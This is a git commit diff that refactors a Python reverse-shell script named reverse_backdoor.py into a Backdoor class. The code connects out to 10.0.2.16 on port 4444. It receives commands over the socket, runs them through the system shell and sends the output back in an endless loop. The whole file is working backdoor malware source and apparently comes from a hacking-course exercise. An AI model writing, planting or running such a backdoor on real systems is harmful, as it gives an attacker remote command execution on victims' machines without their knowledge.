55c2e250a320f682d682d0f8711a784a2362ac0e
Justin Uminga <164306553+justinadg@users.noreply.github.com>
2024-07-26 00:25:31 +0800

    Update reverse_backdoor.py

--- backdoor/reverse_backdoor.py
+++ backdoor/reverse_backdoor.py
@@ -1,17 +1,22 @@
 import socket
 import subprocess
 
-def execute_system_command(command):
-  return subprocess.check_output(command, shell=True)
+class Backdoor:
+  def __init__(self, ip, port):
+    self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    self.connection.connect((ip, port))
+      
+  def execute_system_command(self, command):
+    return subprocess.check_output(command, shell=True)
 
-connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-connection.connect(("10.0.2.16", 4444))
+  def run(self):
+    while True:
+      command = self.connection.recv(1024)
+      result = self.execute_system_command(command)
+      self.connection.send(result)
+    connection.close()
 
-connection.send("\n[+] Connection established.\n")
 
-while True:
-  command = connection.recv(1024)
-  result = execute_system_command(command)
-  connection.send(result)
+backdoor = Backdoor("10.0.2.16", 4444)
+backdoor.run()
 
-connection.close()
